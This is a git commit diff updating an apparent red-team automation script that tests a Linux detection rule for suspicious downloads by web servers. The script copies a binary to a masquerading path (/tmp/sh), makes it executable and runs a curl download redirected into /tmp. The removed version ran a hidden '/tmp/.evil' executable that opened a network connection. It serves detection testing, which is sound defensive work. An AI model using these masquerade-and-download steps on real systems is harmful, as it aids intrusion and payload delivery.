a35fed82a433c611909074209dac2005adb0e1f3
protectionsmachine <72879786+protectionsmachine@users.noreply.github.com>
2024-10-22 12:00:38 +0000

    Sync RTA

--- rta/linux_persistence_webserver_curl_wget_suspicious_redirect.py
+++ rta/linux_persistence_webserver_curl_wget_suspicious_redirect.py
@@ -4,38 +4,35 @@
 # 2.0.
 
 import sys
-
 from . import RtaMetadata, common
 
 metadata = RtaMetadata(
-    uuid="96afe4b1-d8f3-4f95-b92b-645a39508174",
+    uuid="a153dec0-914a-4a03-8b6c-a24e55b6f16a",
     platforms=["linux"],
     endpoint=[
         {
-            "rule_name": "Hidden Executable Initiated Egress Network Connection",
-            "rule_id": "c14705f7-ebd3-4cf7-88b3-6bff2d832f1b",
+            "rule_name": "Suspicious Download and Redirect by Web Server",
+            "rule_id": "fa71e336-0177-4732-b58b-53eb4a87a286",
         },
     ],
-    techniques=["T1564"],
+    techniques=["T1505", "T1059", "T1071"],
 )
 
 
 @common.requires_os(*metadata.platforms)
 def main() -> None:
-    common.log("Creating a fake hidden executable..")
-    masquerade = "/tmp/.evil"
-    source = common.get_path("bin", "netcon_exec_chain.elf")
+    common.log("Creating a fake executable..")
+    masquerade = "/tmp/sh"
+
+    source = common.get_path("bin", "linux.ditto_and_spawn")
     common.copy_file(source, masquerade)
     common.log("Granting execute permissions...")
     common.execute(["chmod", "+x", masquerade])
 
-    commands = [masquerade, "netcon", "-h", "8.8.8.8", "-p", "53"]
+    commands = [masquerade, '-c', 'curl http://8.8.8.8:53/foo > /tmp/foo && xxd']
     common.execute([*commands], timeout=5, kill=True)
-
     common.log("Cleaning...")
-
     common.remove_file(masquerade)
-
     common.log("Simulation successfull!")
 
 
